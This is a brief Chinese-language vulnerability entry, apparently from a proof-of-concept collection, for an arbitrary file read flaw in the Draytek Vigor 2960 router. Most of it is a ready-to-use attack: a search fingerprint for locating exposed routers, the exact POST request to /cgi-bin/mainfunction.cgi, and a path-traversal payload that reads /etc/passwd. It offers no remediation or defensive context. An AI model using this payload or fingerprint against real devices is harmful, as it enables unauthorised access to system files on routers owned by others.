# DraytekVigor2960路由器mainfunction任意文件读取漏洞

- **系统**：DraytekVigor2960　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Vigor 2960"`
- **请求**：`POST /cgi-bin/mainfunction.cgi HTTP/1.1`
- **关键头**：`Content-Length: 94`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=getSyslogFile&option=../../etc/passwd
```

**其他**
- Draytek Vigor 2960 路由器mainfunction任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Draytek Vigor 2960 路由器